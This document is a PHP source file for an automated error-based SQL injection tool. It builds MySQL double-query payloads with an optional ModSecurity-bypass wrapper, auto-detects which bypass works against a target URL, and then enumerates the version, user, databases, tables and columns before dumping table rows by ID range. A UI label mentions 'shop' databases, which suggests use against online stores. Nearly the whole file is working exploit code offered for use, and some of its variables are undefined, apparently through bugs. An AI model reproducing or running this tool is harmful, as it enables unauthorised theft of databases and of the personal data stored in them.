<?php
//exit("fixing");
	set_time_limit(0);
	@require("function_class.php");

	
	//rut gon $_REQUEST["a"] thanh $a 
	foreach($_REQUEST as $key => $value)
	{
		${$key} = $value;
	}
	$url = cleanUpUrl($url);
	
	
	$arrSecBypass = array(
		array("",""),
		array("/*!","*/")
	);
	
	$_exploit1 = $arrSecBypass[$secBypass][0]." And (Select 1 From(Select Count(*),Concat(CHAR (58,58,58),";
	$_exploit2 = ",floor(rAnd(0)*2),CHAR (58,58,58))x From Information_Schema. Tables Group By x)a) ".$arrSecBypass[$secBypass][1].$commentBypass;

	

	if($op == 1)
	{
		//get version
		$info = new CExploit;
		$info->url = _urlEncode($url.$_exploit1."(Version())".$_exploit2);//exit($info->url);
		$info->page = getPage($info->url) or die("time out");
		preg_match("/:::(.*?)1:::/",$info->page,$info->result);
		echo "version() : ".$info->result[1]."<br>";ob_flush();flush();

		//get user
		$info = new CExploit;
		$info->url = _urlEncode($url.$_exploit1."(User())".$_exploit2);
		$info->page = getPage($info->url) or die("time out");
		preg_match("/:::(.*?)1:::/",$info->page,$info->result);
		echo "user() : ".$info->result[1]."<br>";ob_flush();flush();

		//get database
		$info = new CExploit;
		$info->url = _urlEncode($url.$_exploit1."(Database())".$_exploit2);
		$info->page = getPage($info->url) or die("time out");
		preg_match("/:::(.*?)1:::/",$info->page,$info->result);
		echo "database() : ".$info->result[1]."<br>";ob_flush();flush();


		if($useGroupConcat == 1)
		{
			$info = new CExploit;
			$m = 1;
			$strlen = ($strlen == 0 || $strlen == "" || $strlen > 130)?50:$strlen;
			$store = "";

			echo "<select multiple id='dbs' size=10>";
			while(1)
			{
				$info->url = _urlEncode($url.$_exploit1."(Select substr(Group_Concat(Schema_Name),".$m.",".$strlen.") From Information_Schema. Schemata)".$_exploit2);
				$info->page = getPage($info->url) or die("</select>time out");
				if(preg_match("/:::(.*?)1:::/",$info->page,$info->result))
				{
					$info->result[1] = $store.$info->result[1];
					if(strrchr($info->result[1],",") == $info->result[1])
					{
						echo "<option value='".str_replace(",","",$info->result[1])."'>".str_replace(",","",$info->result[1])."</option>";ob_flush();flush();
						break;
					}
					else
					{	
						$store = strrchr($info->result[1],",");
						$info->result[1] = substr($info->result[1],0,strlen($info->result[1])-strlen($store));
						$info->result[1] = explode(",",$info->result[1]);
						foreach($info->result[1] as $value)
							if($value != "")
								echo "<option value='".str_replace(",","",$value)."'>".str_replace(",","",$value)."</option>";ob_flush();flush();
					}
				}
				$m += $strlen;
			}
			echo "</select><br/>
				  <input type='submit' value='get table' onClick='exploit2(2);autoFill(\"dbs\",\"dbGetData\")' />";
		}
		else
		{
			$info = new CExploit;
			$info->result[0] = 1;$info->i = 0;
			echo "<select multiple id='dbs' size=10>";
			while($info->result[0] != "")
			{
				$info->url = _urlEncode($url.$_exploit1."(Select Schema_Name From Information_Schema. Schemata Limit ".$info->i.",1)".$_exploit2);
				$info->page = getPage($info->url) or die("time out");
				if(preg_match("/:::(.*?)1:::/",$info->page,$info->result))
				echo "<option value='".$info->result[1]."'>".$info->result[1]."</option>";ob_flush();flush();
				$info->i++;
			}
			echo "</select><br/>
				  <input type='submit' value='get table' onClick='exploit2(2);autoFill(\"dbs\",\"dbGetData\")' />";
		}
	}
	elseif($op == 2)
	{
		echo "Database : ".$db."<br/><br/>";ob_flush();flush();
		if($useGroupConcat == 1)
		{
			$table = new CExploit;
			$m = 1;
			$strlen = ($strlen == 0 || $strlen == "" || $strlen > 50)?50:$strlen;
			$store = "";

			echo "<select multiple id='tables' size=10>";
			while(1)
			{
				$table->url = _urlEncode($url.$_exploit1."(Select substr(Group_Concat(Table_Name),".$m.",".$strlen.") From Information_Schema. Tables Where Table_Schema=".ascii_mysql($db).")".$_exploit2);
				//exit("</select>".$table->url);
				$table->page = getPage($table->url) or die("</select>time out");
				if(preg_match("/:::(.*?)1:::/",$table->page,$table->result))
				{
					$table->result[1] = $store.$table->result[1];
					if(strrchr($table->result[1],",") == $table->result[1])
					{
						echo "<option value='".str_replace(",","",$table->result[1])."'>".str_replace(",","",$table->result[1])."</option>";ob_flush();flush();
						break;
					}
					else
					{	
						$store = strrchr($table->result[1],",");
						$table->result[1] = substr($table->result[1],0,strlen($table->result[1])-strlen($store));
						$table->result[1] = explode(",",$table->result[1]);
						foreach($table->result[1] as $value)
							if($value != "")
								echo "<option value='".str_replace(",","",$value)."'>".str_replace(",","",$value)."</option>";ob_flush();flush();
					}
				}
				$m += $strlen;
			}
			echo "</select><br/>
				  <input type='hidden' id='dbExploit' value='".$db."' />
				  <input type='submit' value='get column' onClick='exploit2(3);autoFill(\"tables\",\"tableGetData\")' />";
		}
		else
		{
			$table = new CExploit;
			$table->result[0] = 1;$table->i = 0;
			echo "<select multiple id='tables' size=10>";
			while($table->result[0] != "")
			{
				$table->url = _urlEncode($url.$_exploit1."(Select Table_Name From Information_Schema. Tables Where Table_Schema=".ascii_mysql($db)." Limit ".$table->i.",1)".$_exploit2);
				$table->page = getPage($table->url) or die("</select>time out");
				if(preg_match("/:::(.*?)1:::/",$table->page,$table->result))
					echo "<option value='".$table->result[1]."'>".$table->result[1]."</option>";ob_flush();flush();
				$table->i++;
			}
			echo "</select><br/>
				  <input type='hidden' id='dbExploit' value='".$db."' />
				  <input type='submit' value='get column' onClick='exploit2(3);autoFill(\"tables\",\"tableGetData\")' />";
		}
	}
	elseif($op == 3)
	{
		echo "Database : ".$db."<br/>";
		echo "Table : ".$table."<br/>";ob_flush();flush();
		if($useGroupConcat == 1)
		{
			$column = new CExploit;
			$m = 1;
			$strlen = ($strlen == 0 || $strlen == "" || $strlen > 50)?50:$strlen;
			$store = "";$listColumn = "";

			echo "<select multiple id='columns' size=10>";
			while(1)
			{
				$column->url = _urlEncode($url.$_exploit1."(Select substr(Group_Concat(Column_Name),".$m.",".$strlen.") From Information_Schema. Columns Where Table_Schema=".ascii_mysql($db)." And Table_Name=".ascii_mysql($table).")".$_exploit2);
				$column->page = getPage($column->url) or die("</select>time out");
				if(preg_match("/:::(.*?)1:::/",$column->page,$column->result))
				{
					$column->result[1] = $store.$column->result[1];
					if(strrchr($column->result[1],",") == $column->result[1])
					{
						$listColumn .= str_replace(",","",$column->result[1]);
						echo "<option value='".str_replace(",","",$column->result[1])."'>".str_replace(",","",$column->result[1])."</option>";ob_flush();flush();
						break;
					}
					else
					{	
						$store = strrchr($column->result[1],",");
						$column->result[1] = substr($column->result[1],0,strlen($column->result[1])-strlen($store));
						$column->result[1] = explode(",",$column->result[1]);
						foreach($column->result[1] as $value)
							if($value != "")
							{
								$listColumn .= $value."<br>";
								echo "<option value='".str_replace(",","",$value)."'>".str_replace(",","",$value)."</option>";ob_flush();flush();
							}
					}
				}
				$m += $strlen;
			}
			echo "</select><br/>
				  <input type='hidden' id='dbExploit' value='".$db."' />
				  <input type='hidden' id='tableExploit' value='".$table."' />
				  <input type='submit' value='get id' onClick='exploit2(4)' />
				  <input type='hidden' id='listColumn' value='".$listColumn."' />
				  <input type='submit' value='showListColumn' onClick='showListColumn()' />";
		}
		else
		{
			$column = new CExploit;
			$column->result[0] = 1;$column->i = 0;$listColumn = "";
			echo "<select multiple id='columns' size=10>";
			while($column->result[0] != "")
			{
				$column->url = _urlEncode($url.$_exploit1."(Select Column_Name From Information_Schema. Columns Where Table_Schema=".ascii_mysql($db)." And Table_Name=".ascii_mysql($table)." Limit ".$column->i.",1)".$_exploit2);
				$column->page = getPage($column->url) or die("</select>time out");
				if(preg_match("/:::(.*?)1:::/",$column->page,$column->result))
				{
					echo "<option value='".$column->result[1]."'>".$column->result[1]."</option>";ob_flush();flush();
					$listColumn .= $column->result[1]."<br/>";
				}
				$column->i++;
			}
			echo "</select><br/>
				  <input type='hidden' id='dbExploit' value='".$db."' />
				  <input type='hidden' id='tableExploit' value='".$table."' />
				  <input type='submit' value='get id' onClick='exploit2(4)' />
				  <input type='hidden' id='listColumn' value='".$listColumn."' />
				  <input type='submit' value='showListColumn' onClick='showListColumn()' />";
		}
	}
	elseif($op == 4)
	{
		$id = new CExploit;
		$id->url = _urlEncode($url.$_exploit1."(Select Count(".$column.") From ".$db.".".$table.")".$_exploit2);
		//exit($id->url);
		$id->page = getPage($id->url) or die("time out");
		preg_match("/:::(.*?)1:::/",$id->page,$id->result);
		echo "count(".$column.") : ".$id->result[1]."<br>";ob_flush();flush();

		$id = new CExploit;
		$id->url = _urlEncode($url.$_exploit1."(Select Max(".$column.") From ".$db.".".$table.")".$_exploit2);
		$id->page = getPage($id->url) or die("time out");
		preg_match("/:::(.*?)1:::/",$id->page,$id->result);
		echo "max(".$column.") : ".$id->result[1]."<br>";ob_flush();flush();

		$id = new CExploit;
		$id->url = _urlEncode($url.$_exploit1."(Select Min(".$column.") From ".$db.".".$table.")".$_exploit2);
		$id->page = getPage($id->url) or die("time out");
		preg_match("/:::(.*?)1:::/",$id->page,$id->result);
		echo "min(".$column.") : ".$id->result[1]."<br>";ob_flush();flush();
	}
	elseif($op == "5")
	{
		$listColumn = explode("<br/>",$listColumn);
		$i=1;
		foreach($listColumn as $tmp)
		{
			if($tmp == $columnFilterGetData)
				$orderBy = $i;
			$i++;
		}

		$temp1 = explode("abc2",$listColumnGetData);
		$temp2 = explode("abc2",$addition);
		$addition = "";

		foreach($temp2 as $tmp)
			if($tmp != "")
				$addition .= " And ".$tmp;
		
		$data = new CExploit();
		$data->result[0]=1;
		

		while($from <= $to)
		{
			foreach($temp1 as $value)
			{
				$data->url = _urlEncode($url.$_exploit1."(Select ".$value." From ".$db.".".$table." Where ".$columnFilterGetData."=".$from.$addition." )".$_exploit2);
				$data->page = getPage($data->url) or die("time out");
				preg_match("/:::(.*?)1:::/",$data->page,$data->result);
				if($data->result[1]!="")
				{
					echo $data->result[1]." | ";ob_flush();flush();
				}
				else
				{
					if(preg_match("/:::1/",$infor->page))
					{
						echo "null | ";ob_flush();flush();
					}
					elseif(preg_match("/more[\s]than[\s]1[\s]row/",$infor->page))
					{
						$m=1;$result="";
						$data->result[0]=1;
						while(!$infor->result=="")
						{
							$data->url = _urlEncode($url.$_exploit1."(Select ,substr(".$value.",".$m.",44) From ".$db.".".$table." Where ".$columnFilterGetData."=".$from.$addition." )".$_exploit2);
							$data->page=getPage($data->url);
							preg_match("/:::(.*?)1:::/",$data->page,$data->result);
							$result .= $data->result[1];
							$m=$m+44;
							ob_flush();flush();
						}
						echo $data." | ";ob_flush();flush();
					}
					else
					{
						echo "error | ";ob_flush();flush();
					}
				}
			}
			echo "<br/>";ob_flush();flush();
			$from++;
		}

	}
	elseif($op == "0")
	{
		echo "[+]Loading . ";ob_flush();flush();
		$url = str_replace("'","",$url);
		
		for($i=0;$i<count($arrSecBypass);$i++)
		{
			for($j=0;$j<count($arrCommentBypass);$j++)
			{
				
				echo " . ";ob_flush();flush();
				$_exploit1 = $arrCommentBypass[$j][0].$arrSecBypass[$i][0]." And (Select 1 From(Select Count(*),Concat(CHAR (58,58,58),";
				$_exploit2 = ",floor(rAnd(0)*2),CHAR (58,58,58))x From Information_Schema. Tables Group By x)a) ".$arrSecBypass[$i][1].$arrCommentBypass[$j][1];

				$test = new CExploit;
				$test->url = _urlEncode($url.$_exploit1."(Version())".$_exploit2);//echo $test->url."<br>";ob_flush();flush();
				$test->page = getPage($test->url) or die("time out");
				if(preg_match("/:::(.*?)1:::/",$test->page))
				{
					$secBypass = $i;
					$commentBypass = $j;
					$ok = true;
					break;
				}
			}
			if($ok)
			{
				break;
			}
		}
		if(!$ok)
		{
			exit("<br>[-]FAIL");
		}
		echo "<br>[*]DONE<br>
				  [*]You can click \"START\" button<br>";
		?>
		Link : <input type="text" id="url" size="70" value="<?php echo $url.$arrCommentBypass[$commentBypass][0]; ?>"/>
		<select id="commentBypass">
			<?php
			for($i=0;$i<5;$i++)
			{
				if($i == $commentBypass)
				{
						echo "<option value='".$arrCommentBypass[$i][1]."' selected>".urldecode($arrCommentBypass[$i][1])."</option>";
				}
				else
				{
					echo "<option value='".$arrCommentBypass[$i][1]."'>".urldecode($arrCommentBypass[$i][1])."</option>";
				}
			}
			?>
		</select><br/>


		<table>
		<tr>
			<td><input type="radio" id="secBypass_0" name="secBypass" <?php if($secBypass == 0) { echo "checked"; } ?> ></td><td width=200> none </td>
			<td><input type="checkbox" id="useGroupConcat" name="useGroupConcat" onClick="enable()"></td><td>use group_concat (it can't use if shop has too much tables,columns)</td>
		</tr>
		<tr>
			<td><input type="radio" id="secBypass_1" name="secBypass" <?php if($secBypass == 1) { echo "checked"; } ?> ></td><td> bypass mod security</td>
			<td>strlen (40-60 are the best) </td><td><input type="text" id="strlen"  size="3" disabled /></td>
		</tr>
		<tr>
			<td></td><td></td>
			<td></td><td><input type="submit" value="AUTO DETECT" onClick="exploit2(0)" /><input type="submit" value="START" onClick="exploit2(1)" /></td>
		</tr>
		</table>
		<?php

	}
?>